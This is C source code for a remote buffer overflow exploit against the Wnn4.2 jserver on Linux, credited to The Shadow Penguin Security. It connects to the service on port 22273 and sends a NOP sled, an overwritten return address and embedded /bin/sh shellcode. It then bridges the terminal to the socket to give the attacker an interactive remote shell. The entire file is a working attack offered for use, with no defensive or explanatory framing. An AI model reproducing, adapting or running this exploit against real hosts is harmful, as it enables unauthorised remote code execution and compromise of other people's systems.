/*=============================================================================
   Wnn4.2 / jserver remote buffer overflow exploit for Linux
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include <stdio.h>
#include <netdb.h>
#include <fcntl.h>
#include <ctype.h>
#include <unistd.h>
#include <strings.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>

#define TARGET_PORT 22273
#define COMMAND     0x01
#define VERSION     0x4000
#define MAXBUF      800
#define STR1_SIZE   10
#define NOP         0x90
#define RET         0xbffffcb4
#define ADJUST      3

char *shellcode =
"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89\xf0\xab"
"\x89\xfa\x31\xc0\xab\xb0\x04\x04\x07\xcd\x80\x31\xc0\x89\xc3\x40\xcd\x80"
"\xe8\xd9\xff\xff\xff/bin/sh";

void putint(sockfd,c)
int sockfd,c;
{
    unsigned char tmp[4];

    tmp[0]=(c >> (8 * 3))&0xff;
    tmp[1]=(c >> (8 * 2))&0xff;
    tmp[2]=(c >> (8 * 1))&0xff;
    tmp[3]=c&0xff;
    write(sockfd,tmp,4);
}

void term (int p, int c)
{
    char    buf[1032];
    fd_set  rfds;
    int     i;

    while(1){
        FD_ZERO (&rfds);
        FD_SET (p, &rfds);
        FD_SET (c, &rfds);
        if (select ((p > c ? p : c) + 1, &rfds, NULL, NULL, NULL) < 1) return;
        if (FD_ISSET (c, &rfds)){
            if ((i = read (c, buf, sizeof (buf))) < 1) exit (0);
            else write (p, buf, i);
        }
        if (FD_ISSET (p, &rfds)){
            if ((i = read (p, buf, sizeof (buf))) < 1) exit (0);
            else write (c, buf, i);
        }
    }
}
main(int argc,char *argv[])
{
    int                 sockfd,i;
    struct in_addr      addr;
    struct sockaddr_in  target;
    struct hostent      *hs;
    char                buf[MAXBUF];

    if (argc<2){
        printf("usage : %s TargetHost\n",argv[0]);
        exit(1);
    }
    sockfd=socket(AF_INET, SOCK_STREAM, 0);
    target.sin_family=AF_INET;
    target.sin_port=htons(TARGET_PORT);
    if ((target.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if ((hs=gethostbyname(argv[1]))==NULL){
            printf("Can not resolve specified host.\n");
            exit(1);
        }
        target.sin_family = hs->h_addrtype;
        memcpy((caddr_t)&target.sin_addr.s_addr,hs->h_addr,hs->h_length);
    }
    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target))!=0){
        printf("Can not connect to %s:%d\n",argv[1],TARGET_PORT);
        exit(1);
    } 
    putint(sockfd,COMMAND);
    putint(sockfd,VERSION);

    memset(buf,NOP,MAXBUF);
    printf("Jumping Address=%x\n",RET);
    for (i=100+ADJUST;i<400+ADJUST;i+=4){
        buf[i+3]=(RET>>24)&0xff;
        buf[i+2]=(RET>>16)&0xff;
        buf[i+1]=(RET>>8)&0xff;
        buf[i+0]=RET&0xff;
    }
    buf[STR1_SIZE]=0;
    buf[MAXBUF-1]=0;
    memcpy(buf+600+ADJUST,shellcode,strlen(shellcode));
    write(sockfd,buf,MAXBUF);
    printf("Connected to %d\n",TARGET_PORT);
    term(sockfd,0);
}
